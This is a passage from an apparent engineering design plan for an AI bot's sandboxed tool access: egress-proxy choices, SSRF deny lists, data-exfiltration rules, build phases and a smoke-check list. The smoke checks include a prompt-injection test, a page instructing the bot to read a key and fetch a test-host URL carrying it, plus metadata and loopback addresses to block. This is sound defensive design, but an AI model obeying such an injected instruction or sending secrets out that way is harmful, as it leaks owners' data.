  SSRF and abuse from our addresses are closed by construction. It costs a per-page fee, the vendor sees the URLs, and it
  does nothing for the exfil rule.
- **Hosted sandbox providers and MCP gateway products** move the whole sandbox off our CVM or aim at local containers
  and corporate sign-in; neither fits a sandbox that must stay inside the attested CVM.
- Not surveyed: Fly Machines and Envoy's dynamic forward proxy (alternatives to Smokescreen).

### Recommendation, and the spike that decides it

**Recommendation.** Do not adopt iron-proxy for phases 1 and 2. Phase 1 has one fixed destination, which the gateway's
pinned origin already covers. Phase 2 can be built so the CVM only dials fixed vendor hosts (search, and optionally
extract) or with the gateway's own guard, and the costs above (an unauthenticated TLS-intercepting tunnel and a CA to
guard, one dominant maintainer, unsigned releases, recent advisories) buy little there. Phase 3, arbitrary owner hosts,
is where a dedicated dial-out hop earns its place. Choose between Smokescreen (preferred on the survey's evidence:
smaller, public-addresses-only by default, no interception) and iron-proxy (more features, all the costs above), after
the spike below. In every case: a network of its own without ingress, fail closed, the gateway keeps its own guard and
all per-owner secrets, and iron-proxy's MCP policy ideas (default-deny tools, argument conditions, `tools/list`
filtering) are copied into the gateway's rules rather than depended on. Revisit iron-proxy if bots ever need raw package
or `curl` access; it would then sit behind the gateway.

Spike before phase 3, for the chosen hop (1 to 2 days, throwaway CVM or locally; items 4 and 6 are specific to
iron-proxy, the rest apply to either):
1. The gateway's HTTP client reaches a test origin through the proxy's CONNECT listener, first in `sni-only`
   passthrough and then, if interception is wanted, with the proxy's CA, streaming an SSE response without buffering,
   and an MCP Streamable HTTP server through it. Decide MITM or passthrough here.
2. A rebinding name, a name resolving to each private range, each embedded or tunnelled form (IPv4-mapped, `::a.b.c.d`,
   NAT64 `64:ff9b::/96` and `64:ff9b:1::/48`, 6to4 `2002::/16`, Teredo `2001::/32`, site-local `fec0::/10`) and a
   decimal-form literal are each refused at dial time. Through a CONNECT hop the proxy resolves the name again, so the
   gateway's connect-to-the-checked-address does not extend through it: both the proxy and the gateway carry the full
   deny list, and the test runs against each.
3. A redirect to a denied address ends the fetch.
4. The audit line for a request carries no secret, body or token, and shows the swap for a static key.
5. Added latency per call, and memory over a 24-hour run.
6. Whether per-owner tokens can be handled by `file` plus reload or by a `grpc` transform without per-grant restarts; if
   not, they stay in the gateway as designed.
7. With the proxy stopped, a fetch is refused and nothing goes direct; from any container but the gateway (one on the
   same compose project, one on the host network) the tunnel is unreachable.
8. The log carries no fetched path or query in the form we ship, and the 30 s header timeout is raised and exercised.

## Build order

0. **Precondition: decision 2.** No phase builds the TinyCloud grant path before the hosted MCP gives Main separate
   tenant state (or keys tenants by subject and client). Decision 1 (OpenKey's warning and per-permission reject) gates
   the approval copy, not the build.
1. **TinyCloud MCP.** Builds the shared parts the others reuse: the `/v1/mcp` route and JSON-RPC rebuild, the grant
   store and admin-socket hand-off, the budget ledger, the count-only audit, the settings surface and the owner events.
2. **Web.** Adds the guarded fetcher (the SSRF guard is its own module with its own tests, and is the piece phase 3
   reuses), the provider adapter and the web tools. Waits on the provider decision.
3. **Owner-added servers.** Adds the server registry, discovery, the credential flows, tool pinning and the settings
   list. The guard from phase 2 is a prerequisite, so this cannot be built before it.

The egress spike (above) runs before phase 3 starts and decides the dial-out hop for owner-added servers. The gateway's
own guard is built in phase 2 whatever it decides. Each phase
ships behind the existing test-account flag and does not change the others.

## Decisions for the owner of each system (named, not designed here)

1. **OpenKey** (its owner decides): how a bot requester appears on the approval screen: the 1-hour one-off as the
   default and the 7-day renewing choice behind a warning; a "Reject this permission" control. The approval screen on
   main today has a request-level decline and a "belongs to another user" note and no per-permission reject, and the
   MCP's delegation approval goes through the `/delegate` link flows, which show no extra warning (the draft that adds
   one does not cover them: the #538 security review confirmed it). This plan depends on this and the owner copy makes no claim about it until it
   exists. Also the OAuth client and the name shown ("Main, TinyCloud One").
2. **Hosted MCP** (js-sdk `packages/mcp`). **A build precondition, not an option.** Delegations are stored per tenant,
   keyed by the OpenKey subject only, so Main would use any delegation the owner approved for another MCP client, and
   what Main's flow approves would become usable by those clients. Main needs its own restricted MCP address with
   separate tenant state, or an MCP that keys tenants by subject and client. Separately: production delegations are 30
   days and cannot be revoked early (TC-1156), and the native grant path accepts one fixed shape, so the 1-hour and
   7-day windows are token-only until the MCP honours a requested expiry (or Main's address issues shorter
   delegations). A new address is a new OpenKey audience and callback as well, so it joins decision 1.
3. **What "one task" means.** This plan ends the grant when Main's turn settles. If a follow-up message should reuse it,
   say so before build.
4. **Search provider and its key** (a paid credential, so not added without an explicit decision): which of Tavily,
   Brave, Exa, Kagi or self-hosted SearXNG, and a dedicated key for the bots service.
5. **The exfil rule for phase 2 (pick one).** It applies to any conversation whose context holds owner data (not just
   the task that read it) and to web fetch, web search and every owner-added server's tool arguments: (a) no open fetch
   and no owner-added server calls (recommended start); (b) fetch only through a gateway-built search call with the
   query shown or capped at 200 characters, plus owner-typed and search-returned URLs, and owner-added server calls
   blocked; or (c) the owner confirms each new domain and each owner-added server. Without one of these, phase 2 is an
   exfiltration path whatever the egress layer does. See Web access.
6. **Web access has no expiry** (it carries no owner authority). With the exfil rule above in place, "until I turn it
   off" is acceptable; say so if it should expire like the data grants.
7. **Egress layer.** The plan's recommendation: no iron-proxy for phases 1 and 2; for phase 3 a dedicated dial-out hop
   (Smokescreen preferred, iron-proxy the alternative) chosen after a spike. Or build the guard in the gateway only.
   Whichever, the gateway keeps its own checks and the per-owner tokens.

## Smoke check for a later build

On a flagged test account:
- **TinyCloud:** approve "Just for this task" on one app, ask Main to list that app's keys (they come back); ask it to
  read another app (refused by the node); after the turn, a second call is `grant_ended`; Disconnect during a 7-day grant
  and the next call fails; a write tool is `tool_not_permitted`.
- **Isolation and binding:** with another MCP client's delegation already approved for the same owner, Main still gets
  `authority_required` (it cannot use it), and what Main's flow approves is refused when a second client calls. A
  callback with a missing, reused or mismatched `state` (another user or another bot) is rejected, and a code from a
  different OpenKey account fails with `owner_mismatch` and leaves no grant. Disconnect also removes the refresh-token
  file. `GET` and `DELETE` on `/v1/mcp` return 405 and no reply carries `Mcp-Session-Id`.
- **Web:** a fetch of a public page returns text; `http://127.0.0.1`, `http://169.254.169.254`, a name that resolves to a
  private address, and a redirect to either are each refused and counted as `blocked_address`; a 2 MiB page is cut; a
  PDF is `wrong_type`; the 21st fetch in a task is `budget`. With a page that tells Main to read a key and fetch
  `https://<test host>/?d=<value>`, the chosen exfil rule holds: the test host receives no request carrying the value.
- **Owner-added server** (a local test server): the tool list shows; an unselected tool is refused; changing a tool's
  description withholds it; Remove ends the next call.
- **Owner-added server, more:** a server whose discovery names an authorization server on another site makes the add
  screen show that host and require confirmation, the authorization request carries `resource` set to the server's exact
  URL, and the token is refused on any other server or path. Paste a bearer key and then grep the backend and
  supervisor logs for it: it must not appear.
- **Conversation taint:** after a TinyCloud read, finish the task and start another with no grant-bearing call; the
  chosen exfil rule still applies to fetch, search and owner-added server calls until the conversation is reset.
- **Everywhere:** the sandbox's environment, filesystem and a captured request contain no token or key. Report a mock run
  as a mock.
